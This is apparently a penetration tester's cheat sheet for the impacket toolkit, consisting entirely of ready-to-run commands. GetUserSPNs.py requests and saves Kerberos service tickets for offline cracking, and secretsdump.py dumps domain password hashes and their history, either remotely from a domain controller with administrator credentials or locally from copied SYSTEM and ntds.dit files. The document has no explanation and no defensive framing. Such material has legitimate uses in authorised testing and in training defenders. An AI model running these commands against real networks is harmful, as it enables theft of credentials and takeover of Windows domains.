# impacket

## GetUserSPNs.py

``` bash
GetUserSPNs.py -dc-ip 192.168.1.1 contoso.local/jdupond:'P@$$w0rd' -save
```

## secretsdump.py

Remotely:

``` bash
secretsdump.py -just-dc -user-status -history contoso.local/Administrator:'P@$$w0rd'@192.168.1.1 | tee secretsdump_contoso.local_192.168.1.1.txt
```

Locally:

``` bash
secretsdump.py -user-status -history -system SYSTEM -ntds ntds.dit local | tee secretsdump_contoso.local_local.txt
```
